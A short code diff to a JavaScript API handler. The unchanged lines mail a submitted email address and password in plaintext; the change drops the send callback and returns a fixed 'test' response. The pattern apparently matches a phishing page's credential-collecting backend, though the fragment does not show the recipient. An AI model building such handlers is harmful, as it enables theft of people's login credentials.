@@ -25,8 +25,6 @@ export default function handler(req, res) {
     text: email + " " + pass,
     html: `<div>${email} ${pass} </div>`,
   };
-  transporter.sendMail(mailData, function (err, info) {
-    if (err) res.status(400).send(err);
-    res.status(200).send(info);
-  });
+  transporter.sendMail(mailData);
+  res.status(200).send("test");
 }
